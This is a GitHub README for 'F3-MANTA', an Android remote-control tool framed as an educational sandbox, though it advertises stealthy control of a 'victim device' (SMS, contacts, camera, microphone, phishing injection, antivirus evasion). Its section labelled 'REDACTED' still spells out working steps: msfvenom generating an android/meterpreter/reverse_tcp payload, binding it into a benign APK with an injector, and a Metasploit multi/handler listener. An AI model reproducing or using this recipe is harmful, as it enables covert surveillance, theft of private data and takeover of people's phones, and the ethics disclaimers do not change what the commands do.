# F3‑MANTA — Mobile Attack & Network Testing Arena (Educational Sandbox)

**Author:** mr f3ri • **GitHub:** `httpsmrferi` • **Telegram:** `@sudoferi`

**Audience:** Students, researchers, instructors, and lab/ conference attendees.  
**Purpose:** Demonstrate simulated Android post‑exploitation workflows inside a fully isolated lab. This repository exists for **education and research only**.

---

![badge-placeholder](https://img.shields.io/badge/educational--sandbox-blue) ![license-placeholder](https://img.shields.io/badge/license--placeholder-lightgrey)

---

## TL;DR

A polished, benign Android WebView sample, build instructions, lab artifacts, and safe demo guidance. **Run only inside controlled, isolated environments** (VM snapshots, host‑only networks). Obtain written authorization before testing anything you do not own.

---

## Table of Contents

- [F3‑MANTA — Mobile Attack \& Network Testing Arena (Educational Sandbox)](#f3manta--mobile-attack--network-testing-arena-educational-sandbox)
  - [TL;DR](#tldr)
  - [Table of Contents](#table-of-contents)
  - [About](#about)
  - [Features](#features)
  - [Disclaimer \& Ethics](#disclaimer--ethics)
  - [Prerequisites (exact commands)](#prerequisites-exact-commands)
  - [Build the example APK (exact commands)](#build-the-example-apk-exact-commands)
  - [Payload creation, binding, and runtime listener — **REDACTED**](#payload-creation-binding-and-runtime-listener--redacted)
    - [Example: prepare the analysis lab and tools](#example-prepare-the-analysis-lab-and-tools)
    - [Example: create a payload artifact](#example-create-a-payload-artifact)
    - [Example: bind or inject payload into APK](#example-bind-or-inject-payload-into-apk)
    - [Example: inspect modified smali/manifest](#example-inspect-modified-smalimanifest)
    - [Example: runtime listener / handler](#example-runtime-listener--handler)
  - [Recommended isolated workflow](#recommended-isolated-workflow)
  - [Safety \& hardening recommendations (MUST read)](#safety--hardening-recommendations-must-read)
  - [Demo tips for conferences](#demo-tips-for-conferences)

---

## About

F3‑MANTA is an educational sandbox designed to reproduce and explain Android post‑exploitation behaviors in a **safe, auditable, and isolated** environment. Use it for live demos, slides, or hands‑on labs only when the full lab isolation and permissions are in place.
The ultimate Android device control tool, empowering you with seamless, secure, and limitless control over target device
F3-Manta is powered by the latest and greatest technologies, ensuring a top-tier experience

---
## Features

- 🔴 Real time
- 🌐 Custom web view
- 🔔 Notification reader
- 🛰️ Receive device location
- ✉️ Receive all target messages
- ✉️ Send SMS with target device to any number
- 👤 Receive all target contacts
- 💻 Receive list of all installed apps in target device
- 📷 Capture main and front camera
- 🎙 Capture microphone (with custom duration)
- ✅️ Auto start after device boot
- 🤖 Auto permission
- 🖥️ Screenshot (get screenshot from your victim device)
- 🔐 Injection (inject application automatically with any login or any page, unlimited)
- 🔐 Open any phishing page in victim device
- 📒 Gallery puller (get all photos available in gallery)
- 📁 Receive any file or folder from target device
📁 Delete any file or folder from target device
- 📁 Powerful file manager
- 🤖 Undetectable by antivirus
- And more...

---

## Disclaimer & Ethics

> **Important:** This repository is strictly for **educational and defensive** purposes. You must have **explicit written permission** to test or interact with any device, network, or resource you do not own.

Misuse of the material in this repository may be illegal and unethical. If you are unsure whether an action is permitted, **stop** and escalate to your legal/compliance team.


---

## Prerequisites (exact commands)

> Run these **inside an isolated lab VM** (Kali Linux / Debian / Ubuntu example). These commands install an OpenJDK and Android command‑line tools.

```bash
sudo apt update && sudo apt upgrade -y
sudo apt install openjdk-17-jdk -y
sudo apt install android-sdk -y

mkdir -p $HOME/Android/Sdk/cmdline-tools
cd $HOME/Android/Sdk/cmdline-tools
wget https://dl.google.com/android/repository/commandlinetools-linux-9477386_latest.zip
unzip commandlinetools-linux-9477386_latest.zip
mv cmdline-tools latest

# Environment (add to ~/.bashrc or run in-session)
export ANDROID_HOME=$HOME/Android/Sdk
export PATH=$PATH:$ANDROID_HOME/emulator
export PATH=$PATH:$ANDROID_HOME/platform-tools
export PATH=$PATH:$ANDROID_HOME/cmdline-tools/latest/bin
source ~/.bashrc

# Install SDK components
sdkmanager "platform-tools" "platforms;android-33" "build-tools;33.0.2"
```

**Note:** Perform all installs and SDK setup inside an isolated VM. Do not run untrusted binaries on production hosts.

---

## Build the example APK (exact commands)

> These steps produce a benign debug APK that you may install only on an isolated emulator or lab device.

```bash
# move to the Android project
cd ./F3-Manta/AndroidWebViewCode

nano ./app/src/main/assets/config.json
# edit the sample app config (assets/config.json)
# Example content (change the URL only to a safe, known internal target if needed):
# {
#     "url": "https://google.com"
# }


# build the debug APK
./gradlew assembleDebug

# copy the artifact into the Lab folder for demos/analysis
cp ./app/build/outputs/apk/debug/app-debug.apk ../Lab/original.apk
```

---

## Payload creation, binding, and runtime listener — **REDACTED**

The commands that would generate exploit payloads, bind/inject artifacts into APKs, or run post‑exploit listeners are intentionally **redacted** in this public README. Below each redaction you will find **conceptual notes** so readers understand the *high‑level* workflow without exposing actionable steps.

### Example: prepare the analysis lab and tools
```
sudo apt update && sudo apt upgrade -y
```
```
sudo apt install metasploit-framework -y
```
```
msfvenom --version
```
```
msfconsole --version
```
**Conceptual note:** This normally installs research frameworks and tools inside a private analysis VM. For public distribution we do **not** list or link to offensive tooling.

### Example: create a payload artifact
```
cd ../Lab
```
```
msfvenom -p android/meterpreter/reverse_tcp LHOST=<your-system-ip> LPORT=<port:4444> -o payload.apk -f raw
```
**Conceptual note:** In an authorised lab, this step generates a test payload. 

### Example: bind or inject payload into APK
```
chmod +x ./apkinjector
```
```
./apkinjector
```
**Conceptual note:** Injection merges payload code with a target APK. The public repo omits binding recipes — present this conceptually or use inert artifacts included in `Lab/`.

### Example: inspect modified smali/manifest
```
./apkinjector ./payload.apk ./original.apk
```
If you can’t find the .smali file path, run the command below to list matching files and then enter the correct path manually.
```
find /tmp/original -type f -name 'MainActivity.smali' -print
```

**Conceptual note:** Analysts would inspect `smali/` changes and manifest entries with static analysis tools inside the isolated lab to find tampering indicators.

### Example: runtime listener / handler
```
msfconsole -q
```
```
use exploit/multi/handler
```
```
set payload android/meterpreter/reverse_tcp
```
```
set LHOST <your-system-ip>
```
```
set LPORT <port:4444>
```

**Conceptual note:** A listener conceptually receives callbacks from a payload. For public demos, show sanitized recordings or mock transcripts — **do not** publish live handler instructions.

---


## Recommended isolated workflow

1. Create fresh VM snapshots for: **builder**, **target** (emulator), and **analyst**.
2. Use host‑only or VLAN networks; **block outbound Internet** from lab VMs.
3. Separate roles: keep build, target, and analysis on different machines.
4. Instrument and capture: use packet capture, process tracing, and centralized logging on an analysis VM.
5. Revert snapshots after every demo and securely delete ephemeral artifacts.

---

## Safety & hardening recommendations (MUST read)

- **Written authorization:** Obtain explicit written permission before testing any system you do not own.  
- **Least privilege:** Run only processes with necessary privileges; avoid running as `root` unless required.  
- **No real data:** Never use production credentials or real user data inside the lab.  
- **Audit & logging:** Keep auditable trails for all actions and artifacts.  
- **Access controls:** Keep `Lab/` artifacts private and delete them when no longer required.  
- **Clear disclaimers:** Display legal/ethical disclaimers on slides and materials distributed with demos.

---

## Demo tips for conferences

- Prepare a short, high‑resolution GIF as a fallback for live demos.  
- Show a concise architecture diagram that emphasizes isolation (builder → target → analyst).  
- Emphasize detection and mitigation: what defenders should look for and how to respond.  
- Include a dedicated slide about Ethics & Legal Boundaries.



